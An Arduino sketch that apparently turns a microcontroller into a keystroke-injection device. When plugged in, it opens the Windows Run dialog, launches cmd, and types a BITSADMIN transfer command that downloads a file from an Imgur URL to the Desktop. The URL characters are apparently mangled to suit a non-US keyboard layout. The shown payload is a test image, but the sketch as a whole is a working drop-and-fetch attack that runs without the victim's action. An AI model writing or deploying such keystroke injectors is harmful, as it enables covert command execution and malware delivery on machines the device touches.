#include <Keyboard.h>


void setup() {
  Keyboard.begin();
  
  runCmd();
  delay(1000);

  download();
  
  Keyboard.end();
}

void runCmd(){
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  
  delay(1000);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cmd");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
}

void download(){
  Keyboard.print("BITSADMIN &transfer testJob &PRIORITY HIGH ");
  delay(500);
  Keyboard.print("HTTPS?&&I/stack/Imgur/com&huT85/jpg %cd%&Desktop&test/jpg");
  delay(2500);
  Keyboard.press(KEY_RETURN);
  delay(300);
  Keyboard.releaseAll();
}
void loop() {
  // put your main code here, to run repeatedly:

}
